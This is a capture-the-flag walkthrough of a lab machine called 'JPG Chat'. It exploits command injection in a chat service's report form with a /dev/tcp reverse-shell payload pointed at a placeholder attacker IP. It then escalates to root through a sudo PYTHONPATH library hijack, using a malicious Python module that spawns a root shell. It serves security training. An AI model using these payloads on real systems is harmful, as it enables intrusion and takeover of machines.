

# JPG Chat

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.85.243 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

Results:

[x] 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

[x] ]3000/tcp open  ppp?    syn-ack ttl 63

Visiting http://10.10.85.243:3000/ gives us a message:

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

We'll use the following Google dork:

> jpgchat inurl:github

To find the [Github link](https://github.com/Mozzie-jpg/JPChat).

After breefly reviewing the code, we can spot a vulnerable piece:

```python
def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
    ## Command injection!
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

```

So, fire up a netcat listener:

```bash
$ nc -lvnp 8080
```
Next, connect to the chat and use a reverse shell as your name:

```bash
$ nc 10.10.85.243 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
0<&196;exec 196<>/dev/tcp/$ATTACKER_IP_GOES_HERE/8080; sh <&196 >&196 2>&196;echo 'aaa'
your report:
0<&196;exec 196<>/dev/tcp/$ATTACKER_IP_GOES_HERE/8080; sh <&196 >&196 2>&196;echo 'aaa'
```

Upgrade the shell:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'

$ Ctrl+Z

$ stty raw -echo

$ fg (And hit Enter twice)
```

in your machine do:

```bash
$ echo $TERM
```

And use the value in the following command on the victim machine:

```bash
$ export TERM=$THE_VALUE_GOES_HERE

$ export SHELL=bash
```

You can read about upgrading shells [in this blog](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)

The ***user*** flag is under /home/wes/user.txt

## *Root flag*

First, let's find out if we can run anything as root:

```
$ sudo -l
```

Result:

```
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Ok, let's checkout the file:

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

I advise you to checkout this [article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

We see that we can manipulate the path where python searches for libraries.
So navigate to ***/tmp*** and write the following exploit:

```bash
# this file is empty
$ touch __init__.py

$ nano compare.py
```

With this content:

```python
import os;

class Exploit():
	def __init__(self, Str):
		self.Str = Str;

def Str(a, b, c):
	print("Hiiiijaaackeeed");
	os.setuid(0);
	os.setgid(0);
	os.system('/bin/bash');

compare = Exploit(Str);

```

Then, exploit it like this:

```bash
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/development/test_module.py
```

The flag is under ***/root/root.txt***
